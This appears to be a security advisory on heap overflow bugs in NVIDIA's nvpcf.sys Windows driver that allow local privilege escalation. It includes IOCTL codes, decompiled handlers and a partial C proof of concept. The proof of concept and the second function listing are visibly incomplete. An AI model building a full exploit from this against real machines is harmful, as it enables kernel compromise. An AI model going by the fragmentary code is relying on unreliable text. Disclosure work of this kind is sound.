# NVIDIA nvpcf - Multiple Vulnerabilities

## Vendors

* NVIDIA

## Affected Products

NVIDIA Platform Controllers and Framework driver <= 32.0.15.9605

## Summary

NVIDIA's Platform Controllers and Framework driver is susceptible to multiple heap overflow vulnerabilities when processing IOCTL requests from local users, leading to kernel pool corruption and local privilege escalation. This driver is installed by default when configuring and setting up laptops with NVIDIA GPUs on Windows.

## Remediation/Mitigation

Remove the driver from laptops with NVIDIA GPUs.

## Technical Details

`nvpcf.sys` is a Windows KMDF driver packaged with NVIDIA's Windows drivers and installed automatically. It's largely used to manage power and thermal telemetry and has limited exposure to unprivileged usermode. The driver exposes three IOCTLs: `0x320000` (`IOCTL_NVPCF_COMMAND`), `0x320004` (`IOCTL_NVPCF_CREATE`), and `0x320008` (`IOCTL_NVPCF_QUERY`). `0x320000` is a command dispatcher that additionally supports 23 different sub-commands depending on system configuration, and the latter two handlers exist to support object creation, initialization, and lifecycle management. Of these 23 only 6 require elevated privileges.

`IOCTL_NVPCF_COMMAND` stores its sub-commands in a list of structs, each containing a pointer to the handler along with metadata about the call including its sub-command value and whether or not it's restricted to admin. Admin checks are performed leveraging `SeTokenIsAdmin` and appear to be strongly enforced. Additionally, all sub-commands require a session object before the request can be serviced. This can be created using the `IOCTL_NVPCF_CREATE` IOCTL:

```
BYTE cr[64] = {0};
DWORD br;
*(DWORD *)(cr + 0x10) = 1;
DeviceIoControl(hDev, 0x320004, cr, 64, cr, 64, &br, NULL);
DWORD objId = *(DWORD*)(cr + 0x20);
```

All subsequent IOCTLs sent to `IOCTL_NVPCF_COMMAND` then requires the object ID which are looked up in a hashmap within the dispatcher. After verification of the session and any token checks, each handler is invoked with the following:

```
rval = ptr_HandlerFunc(classPtr, sysOutBuf, *((_QWORD *)ioctl + 2));
```

Three arguments are provided: the first is a class instance pointer, the second an output buffer, and finally a pointer to our system buffer provided by the IOCTL (`AssociatedIrp.SystemBuffer`).

One sub-command, `0x01000705`, is used to retrieve the current power configuration. It does this by identifying the active controller and pulling its power balancing configuration (sensor thresholds, dynamic boost offsets, etc.). This information is then copied into a user-provided buffer and returned. Prior to this fetch, however, the handler attempts to validate the input buffer and zero it out:

```c
  if ( !inputSysBuffer )
    return 61;
  result = 0;
  if ( (*inputSysBuffer & 1) != 0 ) // [0]
  {
    v7 = inputSysBuffer + 1;
    v9 = -1;
    memset(inputSysBuffer + 1, 0, 0x110u);  // [1]
    if ( *(_BYTE *)(v5 + 76) )
    {
      v8 = (*(__int64 (__fastcall **)(__int64, char *, _QWORD))(v5 + 128))(v5 + 72, &v9, 0);
      ...
```

At \[0\] we see a check to ensure the first bit is not 0 and, if not, zeros out the buffer at \[1\]. However the length of the user-provided buffer is never provided nor checked; therefore, if a heap buffer smaller than 0x110 is provided it may overflow into adjacent memory. A minimal proof of concept is shown below:

```c
static const GUID GUID_NVPCF = {
    0x29D92575, 0x4CB9, 0x489E,
    {0xA9, 0xAE, 0xD1, 0x8E, 0xFE, 0xCA, 0x76, 0x91}
};

int main(void)
{

                                       DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);

    SP_DEVICE_INTERFACE_DATA ifd = { .cbSize = sizeof(ifd) };
    SetupDiEnumDeviceInterfaces(di, NULL, &GUID_NVPCF, 0, &ifd);

    det->cbSize = sizeof(*det);
    SetupDiGetDeviceInterfaceDetailW(di, &ifd, det, sz, NULL, NULL);

                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
    free(det);
    SetupDiDestroyDeviceInfoList(di);
    if (hDev == INVALID_HANDLE_VALUE) { printf("[-] Open failed\n"); return 1; }

    /* get a session object first */
    BYTE cr[64] = {0};
    DWORD br;
    *(DWORD *)(cr + 0x10) = 1;

    DWORD objId = *(DWORD *)(cr + 0x20);
```

A second heap overflow exists within sub-command 0x01000B01, which appears similar in functionality to the previous bug. Also similar is the fact that the output buffer provided to the function does not have it's length provided nor verified prior to writing into it. The function is small enough to reproduce in full here:

```c

{
  __int64 v4; // rbx
  __int64 v5; // rbx
```

At \[0\] there is a relative call to fetch subsystem entries and will succeed if there is NVIDIA hardware and a fully initialized ACPI, even in cases in which the dynamic parameter entries are not registered yet. Then at \[1\] and \[2\] we see writes into the SystemBuffer. Both writes assume a buffer capable of holding 32 entries (24 bytes each) is allocated and available.
